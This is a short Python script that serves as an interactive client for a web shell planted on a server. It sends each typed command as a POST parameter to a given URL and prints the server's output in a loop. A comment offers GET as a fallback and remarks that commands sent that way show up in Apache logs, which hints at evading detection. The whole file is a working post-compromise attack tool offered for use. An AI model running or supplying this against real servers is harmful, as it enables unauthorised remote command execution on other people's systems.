#! /usr/bin/python3

import requests
import sys

if len(sys.argv) < 2:
    print('syntaxe : {} <url> [<param>]'.format(sys.argv[0]))
    print('get a webshell with url, and use <param> as command post param (by default cmd)')
    quit()

url = sys.argv[1]
if len(sys.argv) > 2:
    cmd = sys.argv[2]
else:
    cmd = 'cmd'

s = requests.Session()

while True:
    c = input('--> ')
    r = s.post(url, data={cmd: c})
    # use this in place of post if you can't make post requests (commands are displayeds in apache logs)
    #r = s.get(url, params={cmd: c})
    print(r.request.url)
    t = r.text
    print(t)


